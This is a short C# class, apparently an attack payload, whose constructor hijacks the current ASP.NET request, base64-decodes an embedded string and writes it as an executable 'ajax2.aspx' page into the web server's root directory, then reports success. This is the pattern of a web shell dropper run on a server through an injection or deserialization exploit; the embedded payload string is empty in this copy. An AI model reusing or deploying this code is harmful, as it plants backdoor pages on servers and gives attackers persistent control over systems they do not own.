using System;
using System.IO;
using System.Web;

class E
{
    public E()
    {
        HttpContext context = HttpContext.Current;
        context.Server.ClearError();
        context.Response.Clear();
        try
        {
            string baseDirectory = AppDomain.CurrentDomain.BaseDirectory;
            string filePath = Path.Combine(baseDirectory, "ajax2.aspx");
			
            
            string content = "";

            byte[] decodedBytes = Convert.FromBase64String(content);
            File.WriteAllBytes(filePath, decodedBytes);
            context.Response.Write("File written successfully to: " + filePath);
        }
        catch (Exception ex)
        {
            context.Response.Write("Error: " + ex.Message);
        }
        finally
        {
            context.Response.Flush();
            context.Response.End();
        }
    }
}